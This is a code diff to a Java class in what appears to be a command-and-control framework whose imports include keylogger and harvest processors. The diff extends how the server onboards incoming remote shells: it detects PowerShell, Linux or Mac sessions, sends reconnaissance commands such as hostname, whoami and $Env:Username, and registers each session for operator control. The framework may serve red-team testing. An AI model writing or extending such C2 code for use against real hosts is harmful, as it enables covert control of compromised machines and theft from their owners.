@@ -20,6 +20,7 @@ import c2.HarvestProcessor;
 import c2.KeyloggerProcessor;
 import c2.session.IOManager;
 import util.Time;
+import util.test.OutputStreamWriterHelper;
 import util.test.TestConfiguration;
 import util.test.TestConfiguration.OS;
 
@@ -105,16 +106,14 @@ public class GenericTCPInitiator extends C2Interface {
 						bw.write("cmd /k hostname");
 						bw.write(System.lineSeparator());
 						bw.flush();
-						Time.sleepWrapped(Constants.getConstants().getTextOverTCPStaticWait());
-						String hostname = wsr.readUnknownLinesFromSocket();
+						String hostname = wsr.readUnknownLinesFromSocketWithTimeout(Constants.getConstants().getTextOverTCPStaticWait());
 						String lines[] = hostname.split(System.lineSeparator());
 						hostname = lines[0];
 
 						bw.write("echo %username%");
 						bw.write(System.lineSeparator());
 						bw.flush();
-						Time.sleepWrapped(Constants.getConstants().getTextOverTCPStaticWait());
-						String username = wsr.readUnknownLinesFromSocket();
+						String username = wsr.readUnknownLinesFromSocketWithTimeout(Constants.getConstants().getTextOverTCPStaticWait());
 						lines = username.split(System.lineSeparator());
 						username = lines[0];
 
@@ -131,29 +130,24 @@ public class GenericTCPInitiator extends C2Interface {
 						bw.write(Constants.NEWLINE);
 						bw.flush();
 
-						Time.sleepWrapped(Constants.getConstants().getTextOverTCPStaticWait());
+						Time.sleepWrapped(5000);//Initial contact can take a while
 						String resp = readUnknownLinesFromSocket(br, newSession, false);
 						//System.out.println("Received: " + resp);
-						TestConfiguration.OS osEn = null;
 						if (resp.contains("Linux")) {
-							osEn = TestConfiguration.OS.LINUX;
+							NixSocketReader lsr = new NixSocketReader(newSession, br, initialBanner.contains("$"));
+							onboardNix(bw, newSession, lsr, TestConfiguration.OS.LINUX);
+						}else if(resp.startsWith("PS")) {
+							//Plot twist - this is a powershell shell
+							PowershellSocketReader psr = new PowershellSocketReader(newSession, br);
+							onboardPowershell(bw, newSession, psr, OS.WINDOWS);
 						}else {
-							osEn = TestConfiguration.OS.MAC;
+							NixSocketReader lsr = new NixSocketReader(newSession, br, initialBanner.contains("$"));
+							onboardNix(bw, newSession, lsr, TestConfiguration.OS.MAC);
 						}
-						NixSocketReader lsr = new NixSocketReader(newSession, br, initialBanner.contains("$"));
-						onboardNix(bw, newSession, lsr, osEn);
+						
 					}
 
-					/*
-					 * System.out.println("Sending..."); bw.write("whoami\n");
-					 * //bw.write(System.lineSeparator()); bw.flush(); try { Thread.sleep(2000); }
-					 * catch (InterruptedException e) { }
-					 * 
-					 * System.out.println(readUnknownLinesFromSocket(br, newSession));
-					 * System.out.println("Done with content");
-					 */
-
-				} catch (IOException e) {
+					} catch (IOException e) {
 					e.printStackTrace();
 					newSession.close();
 				}
@@ -165,20 +159,40 @@ public class GenericTCPInitiator extends C2Interface {
 		}
 	}
 
+	private void onboardPowershell(OutputStreamWriter bw, Socket s, PowershellSocketReader lsr, OS os) throws IOException {
+		OutputStreamWriterHelper.writeAndSend(bw, "hostname" + WindowsSocketReader.WINDOWS_LINE_SEP);
+		String hostname = lsr.readUnknownLinesFromSocketWithTimeout(Constants.getConstants().getTextOverTCPStaticWait());
+		hostname = hostname.replace(System.lineSeparator(), "");
+		hostname = hostname.replace(Constants.NEWLINE, "");
+		
+		OutputStreamWriterHelper.writeAndSend(bw, "$Env:Username" + WindowsSocketReader.WINDOWS_LINE_SEP);
+		String username = lsr.readUnknownLinesFromSocketWithTimeout(Constants.getConstants().getTextOverTCPStaticWait());
+		username = username.replace(System.lineSeparator(), "");
+		username = username.replace(Constants.NEWLINE, "");
+		
+		String osLabel = "PowershellWindows";
+		String sessionUID = hostname + ":" + username + ":" + osLabel;
+		Integer sessionId = ioManager.getSessionId(sessionUID);
+		if (sessionId == null) {
+			sessionId = ioManager.addSession(username, hostname, osLabel);
+		}
+		TCPShellHandler shellHandler = new TCPShellHandler(ioManager, lsr, s, sessionId, hostname, username, lz,
+				os);
+		service.submit(shellHandler);
+	}
+	
 	private void onboardNix(OutputStreamWriter bw, Socket s, NixSocketReader lsr, OS os) throws IOException {
 		bw.write("hostname");
 		bw.write(Constants.NEWLINE);
 		bw.flush();
-		Time.sleepWrapped(Constants.getConstants().getTextOverTCPStaticWait());
-		String hostname = lsr.readUnknownLinesFromSocket();
+		String hostname = lsr.readUnknownLinesFromSocketWithTimeout(Constants.getConstants().getTextOverTCPStaticWait());
 		hostname = hostname.replace(System.lineSeparator(), "");
 		hostname = hostname.replace(Constants.NEWLINE, "");
 
 		bw.write("whoami");
 		bw.write(Constants.NEWLINE);
 		bw.flush();
-		Time.sleepWrapped(Constants.getConstants().getTextOverTCPStaticWait());
-		String username = lsr.readUnknownLinesFromSocket();
+		String username = lsr.readUnknownLinesFromSocketWithTimeout(Constants.getConstants().getTextOverTCPStaticWait());
 		username = username.replace(System.lineSeparator(), "");
 		username = username.replace(Constants.NEWLINE, "");
 
